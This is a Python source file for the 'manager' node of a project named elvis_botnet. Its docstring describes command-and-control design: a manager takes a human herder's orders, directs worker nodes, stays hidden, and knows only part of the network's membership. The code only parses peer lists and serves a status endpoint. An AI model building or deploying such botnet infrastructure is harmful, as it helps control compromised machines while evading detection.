import configparser

from flask import jsonify

from elvis_botnet.node import Node


class Manager(Node):
    """Issues orders and tracks worker/peer manager acknowledgement (herder-facing node).

    A manager is the herder's point of contact: it accepts commands from a
    human operator and coordinates a set of workers, but does not perform
    actions itself so its presence stays hidden. It keeps two primitive
    peer tables (see README "Architecture"):

    - ``managers``: IPs of *some* other manager nodes (never the full
      botnet, so no single node has complete membership knowledge).
    - ``workers``: IPs of the worker nodes this manager directly oversees.

    Both lists are read from the ``[peers]`` section of the node's config.
    """

    node_type = "manager"

    def __init__(self, config: configparser.ConfigParser) -> None:
        # Peer managers and overseen workers, tracked separately per the design doc.
        self.managers = self.parse_peer_list(config, "managers")
        self.workers = self.parse_peer_list(config, "workers")
        super().__init__(config)
        self.logger.info("Manager node initialized.")

    def register_routes(self):
        super().register_routes()
        self.app.add_url_rule(
            "/status",
            view_func=self.status,
            methods=["GET"]
        )

    def status(self):
        return jsonify({
            **self.node_info(),
            "managers": self.managers,
            "workers": self.workers,
        })